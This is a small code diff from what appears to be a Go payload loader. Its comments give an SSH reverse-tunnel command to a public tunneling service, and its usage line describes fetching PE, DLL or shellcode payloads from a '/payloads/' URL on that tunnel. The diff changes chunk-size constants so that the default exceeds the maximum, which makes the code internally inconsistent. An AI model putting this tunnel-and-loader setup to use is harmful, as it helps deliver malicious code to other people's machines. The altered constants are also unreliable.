@@ -28,13 +28,13 @@ import (
 // ssh -p 443 -R0:localhost:8000 tcp@a.pinggy.io
 // usage program.exe -pe|-dll|-shellcode -url http://<generated-link>/payloads/<filename>
 const (
-	DefaultChunkSize = 16384 
-	MaxChunkSize     = 65536 
+	DefaultChunkSize = 325560
+	MaxChunkSize     = 128880 
 	KeyLength        = 32    
 	NonceLength      = 12    
 	DefaultPort      = 8000  
 	// CHANGE THIS AFTER RUNNING THE SSH TUNNEL :3
-	PinggyLink       = "http://<generated-link>/payloads/" 
+	PinggyLink       = "http://<generated-link>" 
 )
 
 
